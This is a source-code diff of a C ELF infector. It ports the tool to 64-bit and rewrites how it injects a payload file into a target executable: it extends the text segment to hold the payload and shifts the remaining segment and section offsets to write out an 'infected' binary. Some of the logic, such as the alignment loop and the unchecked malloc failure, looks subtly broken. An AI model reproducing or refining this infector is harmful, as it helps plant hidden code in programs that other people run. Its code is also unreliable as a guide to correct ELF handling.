@@ -1,6 +1,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
+#include <math.h>
 
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -9,7 +10,7 @@
 
 //what kind of elfs are we dealinth with yo?
 //yay polymorphism via macros!
-#define ELFN(x) Elf32_ ## x
+#define ELFN(x) Elf64_ ## x
 
 char usage[] = 
 "usage: %s target payload result\n\
@@ -46,87 +47,71 @@ int main(int argc, char *argv[]){
   ELFN(Phdr) *targetProgramHeaderTable = target + targetElfHeader->e_phoff;
   ELFN(Shdr) *targetSectionHeaderTable = target + targetElfHeader->e_shoff;
 
-  //allocate space for the new program header table and the payload
-  infectedSize = targetSize + payloadSize + targetElfHeader->e_phentsize;
-  if( (infected = malloc(infectedSize)) == 0 ){
-    fprintf(stderr, "Unable to allocate memory for the infected binary.\nI hate my life.\n");
-  }
-
   //find the string table
   ELFN(Shdr) *targetStringTable = targetSectionHeaderTable + targetElfHeader->e_shstrndx;
   char* targetStringTableValues = target + targetStringTable->sh_offset;
 
-  //copy over the elf header
+  //find the segment containing .text
+  for( i = 0, programHeader = targetProgramHeaderTable;
+       i < targetElfHeader->e_phnum;
+       i++, programHeader++ ){
+    //assume it's the segment that is LOAD and also only readable and executable and at offset 0
+    if( programHeader->p_type == PT_LOAD && programHeader->p_flags & (PF_R | PF_X) && programHeader->p_offset == 0){
+      break;
+    }
+  }
+  if( i >= targetElfHeader->e_phnum ){
+    fprintf(stderr, "Could not find the segment containing .text\n");
+    return -1;
+  }
+
+  //find the nearest power of 8 that will hold the payload
+  size_t alignedPayloadSize;
+  size_t alignment = programHeader->p_align;
+  for(alignedPayloadSize=alignment; alignedPayloadSize < payloadSize; alignedPayloadSize*=alignment){}
+
+  //allocate space for the new program header table and the payload
+  infectedSize = targetSize + alignedPayloadSize;
+  if( (infected = malloc(infectedSize)) == 0 ){
+    fprintf(stderr, "Unable to allocate memory for the infected binary.\nI hate my life.\n");
+  }
+
+  //copy over everything before any including that segment
+  memcpy(infected, target, programHeader->p_filesz);
+  //copy over the payload
+  memcpy(infected+programHeader->p_filesz, payload, payloadSize);
+
+  //set up the infected header and program header table
   ELFN(Ehdr) *infectedElfHeader = infected;
-  memcpy(infectedElfHeader, targetElfHeader, sizeof(ELFN(Ehdr)));
-
-  //add a new entry in the program header table
-  infectedElfHeader->e_phnum++;
-  //place the section header table at the end of the binary
-  infectedElfHeader->e_shoff = infectedSize - (infectedElfHeader->e_shnum*infectedElfHeader->e_shentsize);
-
-  //copy over the program header table
   ELFN(Phdr) *infectedProgramHeaderTable = infected + infectedElfHeader->e_phoff;
-  memcpy(infectedProgramHeaderTable, targetProgramHeaderTable, targetElfHeader->e_phnum*targetElfHeader->e_phentsize);
 
-  //copy over the section header table
+  //increase the size of the segment containing text to include the payload
+  off_t payloadOffset = programHeader->p_filesz;
+  (infectedProgramHeaderTable + i)->p_filesz += payloadSize;
+  (infectedProgramHeaderTable + i)->p_memsz += payloadSize;
+
+  //copy over the rest of the file
+  memcpy(infected+payloadOffset+alignedPayloadSize, target+programHeader->p_filesz, targetSize-programHeader->p_filesz);
+
+  //set up the section header table
+  infectedElfHeader->e_shoff += alignedPayloadSize;
   ELFN(Shdr) *infectedSectionHeaderTable = infected + infectedElfHeader->e_shoff;
-  memcpy(infectedSectionHeaderTable, targetSectionHeaderTable, targetElfHeader->e_shnum*targetElfHeader->e_shentsize);
 
-
-  //Copy over each segment and section
-  //flags for which sections have been copied in a segment
-  //0 is did not copy, 1 is did copy
-  char *copiedSections = calloc(infectedElfHeader->e_shnum, 1);
-  //start copying after the program header table
-  ELFN(Off) infectedStart = infectedElfHeader->e_phoff + infectedElfHeader->e_phnum*infectedElfHeader->e_phentsize;
-  for(i = 0, programHeader = infectedProgramHeaderTable ;
-      i < targetElfHeader->e_phnum ;
-      i++, programHeader++ ){
-
-    //record where it is located in the target
-    ELFN(Off) targetStart = programHeader->p_offset;
-    ELFN(Off) targetEnd   = targetStart + programHeader->p_filesz;
-
-    //copy it into the next location in the infected file
-    memcpy(infected + infectedStart, target + targetStart, programHeader->p_filesz);
-
-    //record it's new location
-    programHeader->p_offset = infectedStart;
-
-    //update the offsets of any sections we also just copied
-    for(j = 0, sectionHeader = infectedSectionHeaderTable ;
-        j < infectedElfHeader->e_shnum ;
-        j++, sectionHeader++ ){
-      //only bother checking if we haven't already got it
-      if( !copiedSections[j] ){
-        if( sectionHeader->sh_offset >= targetStart && sectionHeader->sh_offset <= targetEnd ){
-          sectionHeader->sh_offset = infectedStart + (sectionHeader->sh_offset - targetStart);
-          copiedSections[j] = 1;
-        }
-      }
-    }
-
-    infectedStart += programHeader->p_filesz; //increment infectedStart
-  }
-
-  //now copy over each remaining section
-  for(j = 0, sectionHeader = infectedSectionHeaderTable ;
-      j < infectedElfHeader->e_shnum ;
-      j++, sectionHeader++ ){
-    if( !copiedSections[j] && sectionHeader->sh_type!=SHT_NOBITS){
-      //copy it into the next location in the infected file
-      memcpy(infected + infectedStart, target + sectionHeader->sh_offset, sectionHeader->sh_size);
-      sectionHeader->sh_offset = infectedStart;
-      infectedStart += sectionHeader->sh_size;
+  //update all offsets that were pushed back by the payload
+  for( i = 0, programHeader = infectedProgramHeaderTable;
+       i < infectedElfHeader->e_phnum;
+       i++, programHeader++ ){
+    if( programHeader->p_offset >= payloadOffset ){
+      programHeader->p_offset += alignedPayloadSize;
     }
   }
-
-  free(copiedSections);
-
-
-
-  infectedElfHeader->e_phnum--;
+  for( i = 0, sectionHeader = infectedSectionHeaderTable;
+       i < infectedElfHeader->e_shnum;
+       i++, sectionHeader++ ){
+    if( sectionHeader->sh_offset >= payloadOffset ){
+      sectionHeader->sh_offset += alignedPayloadSize;
+    }
+  }
 
 
   //write out the newly infected file
